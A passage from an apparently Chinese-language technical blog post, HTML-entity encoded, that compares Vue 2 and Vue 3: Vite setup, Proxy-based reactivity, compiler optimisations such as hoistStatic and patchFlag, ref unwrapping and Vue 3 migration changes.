<p>&#x9884;&#x6784;&#x5EFA;&#x4F9D;&#x8D56; =&gt; &#x5F00;&#x53D1;&#x670D;&#x52A1;&#x5668; DevServer &#x542F;&#x52A8;&#x524D;&#x5BF9;&#x5C06;&#x6240;&#x6709;&#x4EE3;&#x7801;&#x89C6;&#x4E3A;&#x539F;&#x751F; ES &#x6A21;&#x5757;&#xFF08;&#x5C06;&#x4F5C;&#x4E3A; CommonJS &#x6216; UMD &#x53D1;&#x5E03;&#x7684;&#x4F9D;&#x8D56;&#x9879;&#x8F6C;&#x6362;&#x4E3A; ESM&#xFF09;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x5206;&#x6790;&#x6A21;&#x5757;&#x7684;&#x5BFC;&#x5165;&#x65F6;&#x4F1A;&#x52A8;&#x6001;&#x5730;&#x5E94;&#x7528;&#x6784;&#x5EFA;&#x8FC7;&#x7684;&#x4F9D;&#x8D56;</p>
</blockquote>
<ul>
<li>&#x642D;&#x5EFA; Vite &#x9879;&#x76EE;</li>
</ul>
<pre><code class="language-shell"># &#x5B89;&#x88C5; vite &#x81EA;&#x5B9A;&#x4E49;&#x521D;&#x59CB;&#x5316;&#x9879;&#x76EE;
npm init vite@latest | yarn create vite

# &#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x9644;&#x52A0;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x9009;&#x9879;&#x76F4;&#x63A5;&#x6307;&#x5B9A;&#x9879;&#x76EE;&#x540D;&#x79F0;&#x548C;&#x60F3;&#x8981;&#x4F7F;&#x7528;&#x7684;&#x6A21;&#x677F;
# npm 7+, &#x9700;&#x8981;&#x989D;&#x5916;&#x7684;&#x53CC;&#x6A2A;&#x7EBF;&#xFF1A;
npm init vite@latest my-vue-app -- --template vue
# yarn
yarn create vite my-vue-app --template vue

cd my-project # &#x5207;&#x6362;&#x521D;&#x59CB;&#x5316;&#x7684;&#x9879;&#x76EE;&#x76EE;&#x5F55;
npm install # &#x5B89;&#x88C5;&#x8BBE;&#x5B9A;&#x5305;&#x5185;&#x5BB9;
npm run dev # &#x542F;&#x52A8;&#x9879;&#x76EE;;package.json&#x4E2D;&#x6709;&#x76F8;&#x5E94;&#x4FE1;&#x606F;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="%E7%A0%B4%E6%97%A7%E7%AB%8B%E6%96%B0">&#x7834;&#x65E7;&#x7ACB;&#x65B0;</h2>
<h3 id="proxy%E6%95%B0%E6%8D%AE%E5%8A%AB%E6%8C%81%E4%BC%98%E5%8C%96">Proxy - &#x6570;&#x636E;&#x52AB;&#x6301;&#x4F18;&#x5316;</h3>
<p>Vue2.x &#x901A;&#x8FC7; defineProperty &#x5BF9;&#x5C5E;&#x6027;&#x8BFB;&#x53D6;&#x548C;&#x4FEE;&#x6539;&#x8FDB;&#x884C;&#x62E6;&#x622A;&#xFF0C;&#x5373;&#x6570;&#x636E;&#x52AB;&#x6301;&#x3002;</p>
<pre><code class="language-javascript">Object.defineProperty(obj, prop, descriptor)
</code></pre>
<p>&#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x5C5E;&#x6027;&#x7684; defineProperty &#x7B49;&#x4EF7;&#x4E8E; <code>targetObject[propertyName] = ?</code>&#x3002;</p>
<pre><code class="language-javascript">Object.defineProperty(targetObject, propertyName, { value: &apos;value&apos; })
Object.defineProperty(targetObject, propertyName, {
  enumerable: false,
  configurable: false,
  writable: false,
  value: &apos;value&apos;
})
</code></pre>
<ul>
<li>
<p>&#x6570;&#x636E;&#x5C5E;&#x6027;&#xFF1A;Configurable&#x3001;Enumerable&#x3001;Writable&#x3001;Value&#xFF1B;</p>
</li>
<li>
<p>&#x8BBF;&#x95EE;&#x5668;&#x5C5E;&#x6027;&#xFF1A;Configurable&#x3001;Enumerable&#x3001;Set&#x3001;Get</p>
</li>
</ul>
<p>data &#x9009;&#x9879;&#x5B9A;&#x4E49;&#x7684;&#x5C5E;&#x6027;&#x4F1A;&#x88AB;&#x9012;&#x5F52;&#x904D;&#x5386;&#x7684;&#x8BBE;&#x7F6E; Get&#x3001;Set &#x8BBF;&#x95EE;&#x5668;&#x5C5E;&#x6027;&#x63CF;&#x8FF0;&#x7B26;&#x3002;&#x6545; Vue2.x &#x4E2D;&#x65B0;&#x589E;&#x3001;&#x5220;&#x9664;&#x9884;&#x5148;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x5C5E;&#x6027;&#x6216;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x4E0B;&#x6807;&#x4FEE;&#x6539;&#x6570;&#x7EC4;&#x90FD;&#x65E0;&#x6CD5;&#x5B9E;&#x73B0;&#x54CD;&#x5E94;&#x5F0F;&#xFF0C;&#x9875;&#x9762;&#x4E5F;&#x4E0D;&#x4F1A;&#x6B63;&#x5E38;&#x66F4;&#x65B0;&#x3002;</p>
<pre><code class="language-javascript">// &#x64CD;&#x4F5C;&#x5BF9;&#x8C61;&#x89E3;&#x51B3;&#x65B9;&#x6848; =&gt; &#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x8D4B;&#x503C;&#x589E;&#x52A0;&#x6216;&#x8005;&#x5220;&#x9664;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;
import Vue from &apos;vue&apos;
Vue.set(obj,&apos;key&apos;,&apos;value&apos;) | Vue.delete(obj,&apos;key&apos;) // way1
this.$set(obj,&apos;key&apos;,&apos;value&apos;) | this.$delete(obj,&apos;key&apos;) // way2
</code></pre>
<pre><code class="language-javascript">// &#x64CD;&#x4F5C;&#x6570;&#x7EC4;&#x89E3;&#x51B3;&#x65B9;&#x6848; =&gt; &#x65E0;&#x6CD5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x4E0B;&#x6807;&#x8D4B;&#x503C;&#x4FEE;&#x6539;&#x6216;&#x8005;&#x5220;&#x9664;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;
import Vue from &apos;vue&apos;
Vue.set(arr,index,&apos;value&apos;) | Vue.delete(arr,index) // way1
this.$set(arr,index,&apos;value&apos;) | this.$delete(arr,index) // way2
this.arr.splice(0,1,&apos;value&apos;) | this.arr.splice(0) // way3
</code></pre>
<p>Vue3.x &#x4F7F;&#x7528;&#x5185;&#x7F6E;&#x7684;&#x6784;&#x9020;&#x51FD;&#x6570; Proxy &#x521B;&#x5EFA;&#x4EE3;&#x7406;&#xFF0C;&#x62E6;&#x622A;&#x5C5E;&#x6027;&#x7684;&#x53D8;&#x5316;&#xFF0C;&#x5E76;&#x901A;&#x8FC7; Reflect &#x5BF9;&#x88AB;&#x4EE3;&#x7406;&#x7684;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;</p>
<pre><code class="language-javascript">let p = new Proxy(targetObject, {
  get(target, propName) { return Reflect.get(target, propName) },
  set(target, propName, value) { Reflect.set(target, propName, value) },
  deleteProperty(target, propName) { return Reflect.deleteproperty(target, propName) }
})
</code></pre>
<p>Vue3.x &#x4F7F;&#x7528; Proxy &#x53EA;&#x4F1A;&#x5BF9;&#x771F;&#x6B63;&#x8BBF;&#x95EE;&#x5230;&#x7684;&#x5185;&#x90E8;&#x5C5E;&#x6027;&#x8FDB;&#x884C;&#x60F0;&#x6027;&#x54CD;&#x5E94;&#x5F0F;&#xFF0C;&#x800C; Vue2.x &#x5BF9;&#x6DF1;&#x5C42;&#x5D4C;&#x5957;&#x7684;&#x5BF9;&#x8C61;&#x9012;&#x5F52;&#x904D;&#x5386;&#x5904;&#x7406;&#x4EE5;&#x5B9E;&#x73B0;&#x54CD;&#x5E94;&#x5F0F;&#xFF0C;&#x65E0;&#x7591;&#x4F1A;&#x9020;&#x6210;&#x8F83;&#x5927;&#x7684;&#x6027;&#x80FD;&#x5F00;&#x9500;&#x3002;</p>
<h3 id="%E7%BC%96%E8%AF%91%E6%97%B6%E7%9A%84%E5%BA%95%E5%B1%82%E6%BA%90%E7%A0%81%E4%BC%98%E5%8C%96">&#x7F16;&#x8BD1;&#x65F6;&#x7684;&#x5E95;&#x5C42;&#x6E90;&#x7801;&#x4F18;&#x5316;</h3>
<ul>
<li>slot &#x7F16;&#x8BD1;&#x4F18;&#x5316;</li>
</ul>
<p>Sub &#x7EC4;&#x4EF6;&#x4EC5;&#x5728;&#x88AB;&#x4F20;&#x5165;&#x52A8;&#x6001; slot &#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x968F; Sup &#x7EC4;&#x4EF6;&#x7684;&#x66F4;&#x65B0;&#x800C;&#x66F4;&#x65B0;&#x3002;</p>
<ul>
<li>diff &#x7B97;&#x6CD5;&#x4F18;&#x5316;</li>
</ul>
<p>&#x9759;&#x6001;&#x6807;&#x8BB0;&#x53D6;&#x7F14;&#x5168;&#x91CF;&#x6BD4;&#x8F83;&#x3002;&#x5C06;&#x6E32;&#x67D3;&#x9897;&#x7C92;&#x5EA6;&#x4ECE;&#x7EC4;&#x4EF6;&#x7EA7;&#x964D;&#x4F4E;&#x5230;&#x533A;&#x5757;&#x7EA7;&#xFF0C;&#x6E32;&#x67D3;&#x6548;&#x7387;&#x4E0D;&#x518D;&#x4E0E;&#x6A21;&#x677F;&#x5927;&#x5C0F;&#x6210;&#x6B63;&#x76F8;&#x5173;&#xFF0C;&#x800C;&#x662F;&#x4E0E;&#x52A8;&#x6001;&#x8282;&#x70B9;&#x7684;&#x6570;&#x91CF;&#x6210;&#x6B63;&#x76F8;&#x5173;&#x3002;&#x53EA;&#x5BF9;&#x6BD4;&#x865A;&#x62DF;&#x8282;&#x70B9;&#x4E2D;&#x5E26;&#x6709;&#x6570;&#x5B57;&#x679A;&#x4E3E;&#x7C7B;&#x578B; patchFlag &#x503C;&#x7684;&#x8282;&#x70B9;&#xFF0C;&#x5176;&#x4ED6;&#x8282;&#x70B9;&#x5F62;&#x6210; block tree &#x7A33;&#x5B9A;&#x7ED3;&#x6784;&#x533A;&#x57DF;&#x3002;</p>
<pre><code class="language-javascript">// &#x89C1; Vue Template Explorer
&lt;div class=&quot;hello&quot;&gt;Hello World!&lt;/div&gt;
&lt;div class=&quot;zs&quot;&gt;Hello zs!&lt;/div&gt;
&lt;div&gt;{{msg}}&lt;/div&gt;
</code></pre>
<pre><code class="language-javascript">import { createElementVNode as _createElementVNode, toDisplayString as _toDisplayString, Fragment as _Fragment, openBlock as _openBlock, createElementBlock as _createElementBlock } from &quot;vue&quot;
export function render(_ctx, _cache, $props, $setup, $data, $options) {
  return (_openBlock(), _createElementBlock(_Fragment, null, [
    _createElementVNode(&quot;div&quot;, { class: &quot;hello&quot; }, &quot;Hello World!&quot;),
    _createElementVNode(&quot;div&quot;, { class: &quot;zs&quot; }, &quot;Hello zs!&quot;),
    _createElementVNode(&quot;div&quot;, null, _toDisplayString(_ctx.msg), 1 /* TEXT */)
  ], 64 /* STABLE_FRAGMENT */))
}
</code></pre>
<p>&#x901A;&#x8FC7;&#x9759;&#x6001;&#x63D0;&#x5347; hoistStatic&#xFF0C;&#x4F7F;&#x4E0D;&#x53C2;&#x4E0E;&#x66F4;&#x65B0;&#x7684;&#x5143;&#x7D20;&#x5728;&#x6BCF;&#x6B21;&#x9700;&#x8981;&#x6E32;&#x67D3;&#x65F6;&#x4EC5;&#x505A;&#x590D;&#x7528;&#xFF0C;&#x4E0D;&#x505A;&#x65B0;&#x5EFA;&#x3002;</p>
<pre><code class="language-javascript">import { createElementVNode as _createElementVNode, toDisplayString as _toDisplayString, Fragment as _Fragment, openBlock as _openBlock, createElementBlock as _createElementBlock } from &quot;vue&quot;
const _hoisted_1 = /*#__PURE__*/_createElementVNode(&quot;div&quot;, { class: &quot;hello&quot; }, &quot;Hello World!&quot;, -1 /* HOISTED */)
const _hoisted_2 = /*#__PURE__*/_createElementVNode(&quot;div&quot;, { class: &quot;zs&quot; }, &quot;Hello zs!&quot;, -1 /* HOISTED */)
export function render(_ctx, _cache, $props, $setup, $data, $options) {
  return (_openBlock(), _createElementBlock(_Fragment, null, [
    _hoisted_1,
    _hoisted_2,
    _createElementVNode(&quot;div&quot;, null, _toDisplayString(_ctx.msg), 1 /* TEXT */)
  ], 64 /* STABLE_FRAGMENT */))
}
</code></pre>
<p>&#x4E8B;&#x4EF6;&#x4F1A;&#x88AB;&#x89C6;&#x4F5C;&#x52A8;&#x6001;&#x7ED1;&#x5B9A;&#xFF0C;&#x6545;&#x6BCF;&#x6B21;&#x6BD4;&#x8F83;&#x90FD;&#x4F1A;&#x8FFD;&#x8E2A;&#x5176;&#x53D8;&#x5316;&#x3002;&#x4F46;&#x5F80;&#x5F80;&#x4E8B;&#x4EF6;&#x7ED1;&#x5B9A;&#x7684;&#x90FD;&#x662F;&#x76F8;&#x540C;&#x51FD;&#x6570;&#xFF0C;&#x6CA1;&#x6709;&#x8FFD;&#x8E2A;&#x53D8;&#x5316;&#x7684;&#x5FC5;&#x8981;&#x3002;&#x53EF;&#x91C7;&#x53D6; cacheHandlers &#x8FDB;&#x884C;&#x7F13;&#x5B58;&#x64CD;&#x4F5C;&#xFF0C;&#x7B49;&#x5F85;&#x590D;&#x7528;&#x3002;</p>
<pre><code class="language-javascript">// vue
&lt;button @click=&quot;clickHandler&quot;&gt;click me&lt;/button&gt;
</code></pre>
<pre><code class="language-javascript">// &#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x7F13;&#x5B58;&#x4E4B;&#x524D;
const _hoisted_1 = [&quot;onClick&quot;]
export function render(_ctx, _cache, $props, $setup, $data, $options) {
  return (_openBlock(), _createElementBlock(&quot;button&quot;, { onClick: _ctx.clickHandler }, &quot;click me&quot;, 8 /* PROPS */, _hoisted_1))
}
</code></pre>
<pre><code class="language-javascript">// &#x4E8B;&#x4EF6;&#x76D1;&#x542C;&#x7F13;&#x5B58;&#x4E4B;&#x540E;&#x5931;&#x53BB;&#x9759;&#x6001;&#x6807;&#x8BB0;
export function render(_ctx, _cache, $props, $setup, $data, $options) {
  return (_openBlock(), _createElementBlock(&quot;button&quot;, {
    onClick: _cache[0] || (_cache[0] = (...args) =&gt; (_ctx.clickHandler &amp;&amp; _ctx.clickHandler(...args)))
  }, &quot;click me&quot;))
}
</code></pre>
<ol>
<li>hoistStatic &#x901A;&#x8FC7; _createStaticVNode &#x5C06;&#x9759;&#x6001;&#x6807;&#x7B7E;&#x8F6C;&#x5316;&#x4E3A;&#x5B57;&#x7B26;&#x4E32;&#xFF1B;</li>
<li>&#x670D;&#x52A1;&#x7AEF;&#x6E32;&#x67D3;&#x662F;&#x901A;&#x8FC7; _ssrRenderAttrs &#x5C06;&#x9759;&#x6001;&#x6807;&#x7B7E;&#x76F4;&#x63A5;&#x8F6C;&#x5316;&#x4E3A;&#x6587;&#x672C;&#x63D2;&#x5165;&#xFF1B;</li>
<li>React &#x662F;&#x5148;&#x5C06; JSX &#x8F6C;&#x5316;&#x4E3A;&#x865A;&#x62DF; DOM&#xFF0C;&#x518D;&#x8F6C;&#x5316;&#x4E3A; HTML&#xFF1B;</li>
</ol>
<pre><code class="language-javascript">&lt;div class=&quot;hello&quot;&gt;Hello World!&lt;/div&gt;
&lt;div class=&quot;zs&quot;&gt;Hello zs!&lt;/div&gt;
&lt;div&gt;{{msg}}&lt;/div&gt;
</code></pre>
<pre><code class="language-javascript">import { mergeProps as _mergeProps } from &quot;vue&quot;
import { ssrRenderAttrs as _ssrRenderAttrs, ssrInterpolate as _ssrInterpolate } from &quot;vue/server-renderer&quot;
export function ssrRender(_ctx, _push, _parent, _attrs, $props, $setup, $data, $options) {
  const _cssVars = { style: { color: _ctx.color }}
  _push(`&lt;!--[--&gt;&lt;div${
    _ssrRenderAttrs(_mergeProps({ class: &quot;hello&quot; }, _cssVars))
  }&gt;Hello World!&lt;/div&gt;&lt;div${
    _ssrRenderAttrs(_mergeProps({ class: &quot;zs&quot; }, _cssVars))
  }&gt;Hello zs!&lt;/div&gt;&lt;div${
    _ssrRenderAttrs(_cssVars)
  }&gt;${
    _ssrInterpolate(_ctx.msg)
  }&lt;/div&gt;&lt;!--]--&gt;`)
}
</code></pre>
<ul>
<li>tree-shaking &#x51CF;&#x5C11;&#x6253;&#x5305;&#x4F53;&#x79EF;</li>
</ul>
<p>&#x5728;&#x7F16;&#x8BD1;&#x9636;&#x6BB5;&#x6807;&#x8BB0;&#x672A;&#x88AB;&#x5F15;&#x7528;&#x7684;&#x51FD;&#x6570;&#x6216;&#x5BF9;&#x8C61;&#xFF0C;&#x5728;&#x538B;&#x7F29;&#x9636;&#x6BB5;&#x5220;&#x9664;&#x6807;&#x8BB0;&#x7684;&#x4EE3;&#x7801;&#x4EE5;&#x5B9E;&#x73B0;&#x6309;&#x9700;&#x6253;&#x5305;&#x3002;&#x8BE5;&#x4F18;&#x5316;&#x53EF;&#x6709;&#x6548;&#x963B;&#x6B62;&#x6784;&#x5EFA;&#x65F6;&#x5C06;&#x5F15;&#x5165;&#x7684;&#x6A21;&#x5757;&#x5168;&#x90E8;&#x6253;&#x5305;&#x3002;</p>
<h3 id="reacts-hooks-composition-api">React&apos;s Hooks &amp; Composition API</h3>
<p>mixin &#x4E0E;&#x7EC4;&#x4EF6;&#x4E4B;&#x95F4;&#x5B58;&#x5728;&#x9690;&#x5F0F;&#x4F9D;&#x8D56;&#xFF1A;mixin &#x4E2D;&#x5B9A;&#x4E49;&#x7684;&#x65B9;&#x6CD5;&#x53EF;&#x80FD;&#x4F1A;&#x53BB;&#x8C03;&#x7528;&#x5176;&#x4ED6;&#x65B9;&#x6CD5;&#x3002;</p>
<p>&#x9AD8;&#x9636;&#x7EC4;&#x4EF6;&#x91C7;&#x53D6;&#x9ED1;&#x76D2;&#x5916;&#x5C42;&#x5305;&#x88F9;&#x7EC4;&#x4EF6;&#xFF0C;&#x589E;&#x52A0;&#x4E86;&#x590D;&#x6742;&#x5EA6;&#x548C;&#x7406;&#x89E3;&#x6210;&#x672C;&#x3002;</p>
<p>Render Props &#x4F1A;&#x5BFC;&#x81F4;&#x4EE3;&#x7801;&#x4F53;&#x79EF;&#x8FC7;&#x5927;&#xFF0C;&#x5D4C;&#x5957;&#x8FC7;&#x6DF1;&#x7684;&#x95EE;&#x9898;&#x3002;</p>
<p>React Hooks &#x4F1A;&#x5728;&#x6BCF;&#x6B21;&#x7EC4;&#x4EF6;&#x6E32;&#x67D3;&#x65F6;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x3002;&#x4E0D;&#x5141;&#x8BB8;&#x5728;&#x5FAA;&#x73AF;&#x5185;&#x90E8;&#x3001;&#x6761;&#x4EF6;&#x8BED;&#x53E5;&#x6216;&#x5D4C;&#x5957;&#x51FD;&#x6570;&#x4E2D;&#x8C03;&#x7528; Hooks =&gt; &#x5E95;&#x5C42;&#x662F;&#x57FA;&#x4E8E;&#x94FE;&#x8868;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x6BCF;&#x4E00;&#x4E2A; hook &#x7684; next &#x4F1A;&#x6307;&#x5411;&#x4E0B;&#x4E00;&#x4E2A; hook&#x3002;</p>
<p>&#x7EC4;&#x5408;&#x5F0F; API &#x53EA;&#x80FD;&#x5728; setup &#x94A9;&#x5B50;&#x4E2D;&#x4F7F;&#x7528;&#xFF0C;&#x66F4;&#x6539; data &#x4F1A;&#x4F7F;&#x76F8;&#x5173;&#x51FD;&#x6570;&#x6216;&#x6A21;&#x677F;&#x91CD;&#x65B0;&#x8BA1;&#x7B97;&#x3002;</p>
<h3 id="ref-%E8%87%AA%E5%8A%A8%E8%A7%A3%E5%8C%85">Ref &#x81EA;&#x52A8;&#x89E3;&#x5305;</h3>
<ul>
<li>&#x6A21;&#x677F;&#x4E2D;&#x7684;&#x89E3;&#x5305;&#x662F;&#x6D45;&#x5C42;&#x7684;&#x89E3;&#x5305;</li>
</ul>
<p>&#x5E38;&#x89C4; ref &#x5728;&#x6A21;&#x677F;&#x4E2D;&#x4F5C;&#x4E3A;&#x9876;&#x5C42; property &#x88AB;&#x8BBF;&#x95EE;&#x65F6;&#x5C06;&#x81EA;&#x52A8;&#x89E3;&#x5305;&#xFF0C;&#x4E0D;&#x9700;&#x8981;&#x4F7F;&#x7528; .value&#x3002;</p>
<p>&#x5F53; ref &#x653E;&#x5165;&#x666E;&#x901A;&#x5BF9;&#x8C61;&#x65F6;&#xFF0C;&#x5728;&#x6A21;&#x677F;&#x4E2D;&#x7684;&#x4F7F;&#x7528;&#x9700;&#x8981; .value&#x3002;</p>
<pre><code class="language-jsx">&lt;template&gt;
  &lt;span&gt;{{ info.msg.value }}&lt;/span&gt;
&lt;/template&gt;
&lt;script&gt;
import { ref } from &quot;vue&quot;;
export default {
  setup(){
    const msg = ref(&quot;Hello, Unpack or not!&quot;);
    const info = { msg };
    return { msg, info }
  }
}
&lt;/script&gt;
</code></pre>
<ul>
<li>ref &#x653E;&#x5165; reactive &#x7684;&#x5C5E;&#x6027;&#x4E2D;&#xFF0C;&#x5728;&#x6A21;&#x677F;&#x91CC;&#x4F7F;&#x7528;&#x4F1A;&#x81EA;&#x52A8;&#x89E3;&#x5305;</li>
</ul>
<pre><code class="language-jsx">&lt;template&gt;
  &lt;span&gt;{{ info.msg }}&lt;/span&gt;
&lt;/template&gt;
&lt;script&gt;
import { ref, reactive } from &quot;vue&quot;;
export default {
  setup(){
    const msg = ref(&quot;Hello, Unpack or not!&quot;);
    const info = reactive({ msg });
    return { msg, info }
  }
}
&lt;/script&gt;
</code></pre>
<h3 id="vue-clivuecli-508">Vue CLI - @vue/cli 5.0.8</h3>
<ul>
<li>main.js =&gt; &#x7A0B;&#x5E8F;&#x5165;&#x53E3;&#x6587;&#x4EF6;</li>
</ul>
<p>Vue2 =&gt; &#x5F15;&#x5165; Vue &#x51FD;&#x6570;&#xFF0C;&#x4EE5; new &#x7684;&#x65B9;&#x5F0F;&#x521B;&#x5EFA; Vue &#x5B9E;&#x4F8B;&#x5E76;&#x6302;&#x8F7D;&#x5230; DOM&#x3002;<br>
Vue3 =&gt; &#x89E3;&#x6784; createApp &#x51FD;&#x6570;&#xFF0C;&#x5728;&#x5176;&#x540E;&#x94FE;&#x5F0F;&#x8C03;&#x7528;&#x65B9;&#x6CD5;&#xFF0C;&#x5E76;&#x6302;&#x8F7D;&#x4E8E; DOM&#x3002;</p>
<pre><code class="language-javascript">// vue2
import Vue from &apos;vue&apos;;
import App from &apos;./App/vue&apos;;
import router from &apos;./router&apos;;
import store from &apos;./store&apos;;
Vue.config.productionTip = false;
new Vue({ router, store, render: h =&gt; h(App) }).$mount(&quot;#app&quot;)
// vue3
import { createApp } from &apos;vue&apos;;
import App from &apos;./App/vue&apos;;
import router from &apos;./router&apos;;
import store from &apos;./store&apos;;
createApp(App).use(router).use(store).mount(&apos;#app&apos;);
</code></pre>
<ul>
<li>
<p>vuex =&gt; new Vuex.Store() &#x8F6C;&#x53D8;&#x4E3A; createStore()</p>
</li>
<li>
<p>&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53D8;&#x5316; =&gt; &#x975E; Vue3 &#x7684;&#x53D8;&#x5316; =&gt; &#x5E38;&#x4F5C;&#x4E3A;&#x7B2C;&#x4E09;&#x65B9;&#x5F15;&#x5165;&#x7EC4;&#x4EF6;&#x7684;&#x914D;&#x7F6E;</p>
</li>
<li>
<p>@vue/cli3 &#x542F;&#x52A8;&#x65F6;&#x4E0D;&#x4F1A;&#x521B;&#x5EFA; vue.config.js&#xFF0C;&#x6B32;&#x6539; Webpack &#x914D;&#x7F6E;&#x65F6;&#x81EA;&#x884C;&#x521B;&#x5EFA;</p>
</li>
</ul>
<p>vue-cli(1.x&#x3001;2.x) &#x7684;&#x540E;&#x7EED;&#x7684;&#x7248;&#x672C;&#x867D;&#x5DF2;&#x5185;&#x90E8;&#x9AD8;&#x5EA6;&#x96C6;&#x6210; Webpack&#xFF0C;&#x4F46;&#x4F9D;&#x7136;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x521B;&#x5EFA; vue.config.js &#x53BB;&#x8986;&#x76D6;&#x9ED8;&#x8BA4;&#x7684;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;</p>
<h3 id="%E5%85%B6%E4%BB%96%E6%94%B9%E5%8F%98">&#x5176;&#x4ED6;&#x6539;&#x53D8;</h3>
<ul>
<li>&#x5168;&#x5C40; API &#x7684;&#x8F6C;&#x79FB; =&gt; Vue.xxx &#x8C03;&#x6574;&#x5230;&#x5E94;&#x7528;&#x5B9E;&#x4F8B; app &#x4E0A;</li>
</ul>
<pre><code class="language-jsx">|       2.x &#x5168;&#x5C40; API       |         3.x &#x5B9E;&#x4F8B; API        |
|:------------------------:|:---------------------------:|
|      Vue.config.xxx      |        app.config.xxx       |
| Vue.config.productionTip |            remove           |
|       Vue.component      |        app.component        |
|       Vue.directive      |        app.directive        |
|         Vue.mixin        |          app.mixin          |
|          Vue.use         |           app.use           |
|       Vue.prototype      | app.config.globalproperties |
</code></pre>
<ul>
<li>&#x8FC7;&#x6E21;&#x7C7B;&#x540D;&#x66F4;&#x6539;</li>
</ul>
<pre><code class="language-javascript">// v2.x
.v-enter, .v-leave-to {opacity: 0;}
.v-leave, .v-enter-to {opacity: 1;}
// v3.x 
.v-enter-from, .v-leave-to {opacity: 0;}
.v-leave-from, .v-enter-to {opacity: 1;}
</code></pre>
<ul>
<li>&#x56E0;&#x517C;&#x5BB9;&#x6027;&#x79FB;&#x9664; keyCode &#x4F5C;&#x4E3A; v-on &#x7684;&#x4FEE;&#x9970;&#x7B26;&#xFF1B;&#x4E0D;&#x518D;&#x652F;&#x6301; config.keyCodes</li>
</ul>
<pre><code class="language-html">&lt;!-- Vue 2 Key Code on v-on --&gt;
&lt;input v-on:keyup.13=&quot;submit&quot; /&gt;
&lt;input v-on:keyup.8=&quot;confirmDelete&quot; /&gt;
&lt;!-- Vue 3 Key Modifier on v-on --&gt;
&lt;input v-on:keyup.enter=&quot;submit&quot; /&gt;
&lt;input v-on:keyup.delete=&quot;confirmDelete&quot; /&gt;
</code></pre>
<pre><code class="language-jsx">// Vue2 &#x5B58;&#x5728; -&gt; &#x73B0;&#x5DF2;&#x79FB;&#x9664;
Vue.config.keyCodes.defineAliasButton = 13 // &#x5B9A;&#x4E49;&#x6309;&#x952E;&#x522B;&#x540D;
</code></pre>
<ul>
<li>Fragments</li>
</ul>
<p>&#x56E0; Vue2.x &#x4E0D;&#x652F;&#x6301; multiple root &#x7EC4;&#x4EF6;&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x901A;&#x8FC7;&#x5C06;&#x7EC4;&#x4EF6;&#x90FD;&#x5305;&#x542B;&#x5728;&#x4E00;&#x4E2A; &lt;div&gt; &#x4E2D;&#x4FEE;&#x590D;&#x8B66;&#x544A;&#x3002;Vue 3 &#x4E2D;&#x652F;&#x6301;&#x901A;&#x8FC7;&#x591A;&#x6839;&#x8282;&#x70B9;&#x7EC4;&#x4EF6;&#x6765;&#x51CF;&#x5C11;&#x5C42;&#x7EA7;&#x3002;&#x5E95;&#x5C42;&#x903B;&#x8F91;&#xFF0C;&#x65E0;&#x9700;&#x64CD;&#x4F5C;&#x3002;</p>
<ul>
<li>
<p><a href="https://cn.vuejs.org/api/options-state.html#data">data</a> &#x9009;&#x9879;&#x59CB;&#x7EC8;&#x88AB;&#x58F0;&#x660E;&#x4E3A;&#x51FD;&#x6570;&#xFF0C;&#x9632;&#x6B62;&#x7EC4;&#x4EF6;&#x590D;&#x7528;&#x65F6;&#x6570;&#x636E;&#x5173;&#x8054;&#x6240;&#x9020;&#x6210;&#x7684;&#x5E72;&#x6270;</p>
</li>
<li>
<p>&#x79FB;&#x9664; v-on.native &#x4FEE;&#x9970;&#x7B26; =&gt; native &#x7528;&#x4E8E;&#x6307;&#x660E;&#x539F;&#x751F;&#x4E8B;&#x4EF6;&#xFF0C;&#x975E;&#x81EA;&#x5B9A;&#x4E49;&#x4E8B;&#x4EF6;</p>
</li>
</ul>
<pre><code class="language-jsx">// Vue2 &#x9ED8;&#x8BA4; click &#x662F;&#x81EA;&#x5B9A;&#x4E49;&#x4E8B;&#x4EF6;
&lt;Xxx @click.native=&quot;yyy&quot; /&gt;
</code></pre>
<p>&#x7ED9;&#x7EC4;&#x4EF6;&#x7ED1;&#x5B9A;&#x7684;&#x4E8B;&#x4EF6;&#x82E5;&#x6CA1;&#x6709;&#x88AB;&#x58F0;&#x660E;&#x63A5;&#x6536;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;&#x539F;&#x751F;&#x4E8B;&#x4EF6;&#xFF1B;&#x82E5;&#x58F0;&#x660E;&#x63A5;&#x53D7;&#xFF0C;&#x5219;&#x8868;&#x793A;&#x4E3A;&#x81EA;&#x5B9A;&#x4E49;&#x4E8B;&#x4EF6;&#x3002;</p>
<pre><code class="language-jsx">// Sup &#x7EC4;&#x4EF6;&#x7ED1;&#x5B9A;&#x4E8B;&#x4EF6;
&lt;my-xxx v-on:close=&quot;handleComponentEvent&quot; v-on:click=&quot;handleNativeEvent&quot; /&gt;
</code></pre>
<pre><code class="language-jsx">// Sub &#x7EC4;&#x4EF6;&#x58F0;&#x660E;&#x81EA;&#x5B9A;&#x4E49;&#x4E8B;&#x4EF6;
&lt;script&gt;
  export default {
    emits: [&quot;close&quot;] // &#x58F0;&#x660E;&#x5219;&#x4E3A;&#x81EA;&#x5B9A;&#x4E49;&#x4E8B;&#x4EF6; -&gt; &#x4E0D;&#x58F0;&#x660E;&#x4E3A;&#x539F;&#x751F;&#x4E8B;&#x4EF6;
  }
&lt;/script&gt;
</code></pre>
<ul>
